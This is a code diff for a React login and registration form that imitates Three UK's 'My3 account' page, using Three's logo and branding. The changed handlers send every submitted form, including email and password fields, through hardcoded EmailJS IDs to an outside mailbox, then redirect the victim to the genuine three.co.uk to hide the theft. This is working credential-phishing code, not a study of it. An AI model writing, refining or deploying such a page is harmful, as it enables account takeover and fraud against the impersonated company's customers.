@@ -254,6 +254,7 @@ const AuthForm = () => {
   const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   const [accountType, setAccountType] = useState("personal");
 
+  // State for input fields
   const [formData, setFormData] = useState({
     email: "",
     message: "",
@@ -261,39 +262,65 @@ const AuthForm = () => {
     phone: "",
   });
 
+  // Handlers for input changes
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
   };
 
   const form = useRef();
 
-  const handleSubmit = (e) => {
+  const sendLoginEmail = (e) => {
     e.preventDefault();
 
-    const serviceID = isRegister ? "service_if35cp5" : "template_xk4q42o";
-    const templateID = isRegister ? "template_tfgbwnb" : "template_d2cwq39";
-
     emailjs
-      .sendForm(serviceID, templateID, form.current, "6RY4naFuZRPfFL-sW")
+      .sendForm(
+        "service_p19epqf", // Replace with your EmailJS Service ID
+        "template_z0l0xqi", // Replace with your EmailJS Template ID
+        form.current,
+        "dGltTd9KyCeIUTtJS" // Replace with your EmailJS Public Key
+      )
       .then(
         (result) => {
           console.log("Email sent:", result.text);
-          setTimeout(() => {
-            window.location.href = "https://www.three.co.uk/";
-          }, 500);
+          // Redirect to the URL after successful submission
+          window.location.href = "https://www.three.co.uk/";
         },
         (error) => {
           console.log("Error:", error.text);
-          setTimeout(() => {
-            window.location.href = "https://www.three.co.uk/";
-          }, 500);
         }
       );
+
+    e.target.reset();
+  };
+
+  const sendRegisterEmail = (e) => {
+    e.preventDefault();
+
+    emailjs
+      .sendForm(
+        "service_p19epqf", // Replace with your EmailJS Service ID
+        "template_14kjfpu", // Replace with your EmailJS Template ID
+        form.current,
+        "dGltTd9KyCeIUTtJS" // Replace with your EmailJS Public Key
+      )
+      .then(
+        (result) => {
+          console.log("Email sent:", result.text);
+          // Redirect to the URL after successful submission
+          window.location.href = "https://www.three.co.uk/";
+        },
+        (error) => {
+          console.log("Error:", error.text);
+        }
+      );
+
+    e.target.reset();
   };
 
   return (
     <div className="flex justify-center items-center min-h-screen bg-white">
       <div className="w-full max-w-sm text-center">
+        {/* Logo */}
         <div className="flex justify-center mb-4">
           <img
             src="https://www.three.co.uk/content/experience-fragments/threedigital/uk/en/site/header/master/_jcr_content/root/header/top/logo.coreimg.svg/1668177162294/three-logo.svg"
@@ -302,8 +329,10 @@ const AuthForm = () => {
           />
         </div>
 
+        {/* Title */}
         <h2 className="text-4xl font-bold">My3 account</h2>
 
+        {/* Tabs */}
         <div className="flex justify-center mt-4 border-b border-gray-900">
           <button
             className={`w-1/2 pb-2 font-medium text-center ${
@@ -323,7 +352,12 @@ const AuthForm = () => {
           </button>
         </div>
 
-        <form ref={form} className="mt-6 text-left" onSubmit={handleSubmit}>
+        {/* Form */}
+        <form
+          ref={form}
+          className="mt-6 text-left"
+          onSubmit={isRegister == "Login" ? sendLoginEmail : sendRegisterEmail}
+        >
           {isRegister && (
             <div className="mb-4">
               <label className="block text-gray-700 font-medium">
@@ -369,6 +403,7 @@ const AuthForm = () => {
             </div>
           )}
 
+          {/* Email Input */}
           <div className="relative">
             <input
               type="email"
@@ -381,6 +416,7 @@ const AuthForm = () => {
             />
           </div>
 
+          {/* Password Input */}
           <div className="relative mt-4">
             <input
               type={showPassword ? "text" : "password"}
@@ -406,6 +442,7 @@ const AuthForm = () => {
                 <p>• Try forming one with 3 random words.</p>
               </div>
 
+              {/* Confirm Password Input */}
               <div className="relative mt-4">
                 <input
                   type={showConfirmPassword ? "text" : "password"}
@@ -438,6 +475,7 @@ const AuthForm = () => {
             </div>
           )}
 
+          {/* Submit Button */}
           <button
             type="submit"
             className="w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6"
